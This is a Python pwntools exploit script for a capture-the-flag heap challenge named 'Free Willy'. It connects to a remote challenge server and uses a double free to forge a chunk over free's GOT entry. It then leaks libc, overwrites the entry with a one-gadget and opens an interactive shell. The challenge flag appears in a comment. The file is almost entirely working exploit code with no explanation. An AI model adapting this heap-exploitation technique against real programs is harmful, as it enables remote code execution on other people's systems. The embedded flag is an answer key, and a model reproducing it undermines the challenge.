#exploit for Free Willy
#flag=flag{always_release_willy_after_freeing}
from pwn import *
gadgets=[0x4f2c5,0x4f322,0xe569f,0xe5858,0xe585f,0xe5863,0x10a38c,0x10a398]
for gadget in gadgets:
	elf=ELF('./free-willy')
	libc=elf.libc
	target=remote('jh2i.com', 50021)

	def adopt(name):
		print(target.recvuntil("> "))
		target.sendline("adopt")
		print(target.recvuntil("whale?\n"))
		target.send(name)

	def disown(index):
		print(target.recvuntil("> "))
		target.sendline("disown")
		print(target.recv())
		target.sendline(str(index))

	def rename(index,name):
		target.sendline("name")
		print(target.recv())
		target.sendline(str(index))
		print(target.recvline())
		target.send(name)


	adopt("A\n")
	disown(0)
	disown(0)
	free_got=0x603018
	fake=p64(0)+p64(free_got)+p64(0x50)+p64(0x1)
	adopt(fake+"\n")
	print(target.recvuntil("> "))
	target.sendline("observe")
	print(target.recvuntil("0. "))
	leak=target.recvline().strip("\n")
	libc_free=u64(leak.ljust(8,"\x00"))
	libc_base=libc_free-libc.symbols["free"]
	libc_gadget=libc_base+gadget
	print(hex(libc_base))
	print(target.recv())
	target.sendline("0")
	print(target.recv())
	payload=p64(libc_gadget)*10
	rename(0,payload)	
	target.interactive()
		
